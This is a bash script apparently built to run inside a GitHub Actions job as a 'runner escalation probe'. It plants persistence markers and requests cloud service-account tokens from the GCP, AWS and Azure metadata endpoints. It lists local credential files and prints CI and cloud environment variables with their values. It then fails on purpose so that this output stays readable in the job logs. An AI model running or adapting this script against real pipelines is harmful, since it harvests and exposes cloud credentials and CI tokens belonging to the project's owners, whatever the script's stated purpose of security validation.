#!/usr/bin/env bash
set -euo pipefail

echo "=== distroless runner escalation probe ==="
echo "date=$(date -Is)"
echo "uname=$(uname -a)"
echo "whoami=$(whoami)"
echo "pwd=$(pwd)"
echo "run_id=${GITHUB_RUN_ID:-missing}"
echo "attempt=${GITHUB_RUN_ATTEMPT:-missing}"

marker1="/tmp/distroless_runner_marker"
marker2="$HOME/.distroless_runner_marker"
value="marker_from_${GITHUB_RUN_ID:-no_run_id}_${GITHUB_RUN_ATTEMPT:-na}"

echo
echo "[1] Persistence probe"
if [[ -f "$marker1" || -f "$marker2" ]]; then
  echo "PERSISTENCE_HIT: found prior marker(s)"
  [[ -f "$marker1" ]] && echo " - $marker1: $(cat "$marker1" 2>/dev/null || true)"
  [[ -f "$marker2" ]] && echo " - $marker2: $(cat "$marker2" 2>/dev/null || true)"
else
  echo "No existing markers found"
fi
echo "$value" > "$marker1"
echo "$value" > "$marker2"
echo "Wrote markers:"
echo " - $marker1"
echo " - $marker2"

echo
echo "[2] Metadata probe (GCP/AWS/Azure)"
echo "GCP token endpoint:"
curl -sS -m 2 -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" || true
echo
echo "AWS role endpoint:"
curl -sS -m 2 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" || true
echo
echo "Azure IMDS endpoint:"
curl -sS -m 2 -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || true
echo

echo
echo "[3] Ambient credentials probe"
for p in \
  "$HOME/.docker/config.json" \
  "$HOME/.config/gcloud" \
  "$HOME/.aws/credentials" \
  "$HOME/.npmrc"; do
  if [[ -e "$p" ]]; then
    echo "FOUND_CRED_PATH: $p"
  fi
done
env | grep -E '^(ACTIONS_|GITHUB_|GOOGLE_|GCLOUD_|AWS_|AZURE_|DOCKER_|CRANE_|COSIGN_)' | sort || true

echo
echo "[4] Cache context probe"
echo "ACTIONS_CACHE_URL=${ACTIONS_CACHE_URL:-}"
echo "ACTIONS_RUNTIME_URL=${ACTIONS_RUNTIME_URL:-}"
echo "ACTIONS_RESULTS_URL=${ACTIONS_RESULTS_URL:-}"
echo "ACTIONS_RUNTIME_TOKEN_PRESENT=$([[ -n "${ACTIONS_RUNTIME_TOKEN:-}" ]] && echo yes || echo no)"

echo
echo "=== probe complete ==="

# GitHub Actions usually hides output for passing tests. Force a failure so the full probe
# output is visible in CI logs for security validation.
if [[ "${PROBE_FAIL_FOR_LOGS:-1}" == "1" ]]; then
  echo "FORCED_FAILURE_FOR_LOG_VISIBILITY"
  exit 1
fi
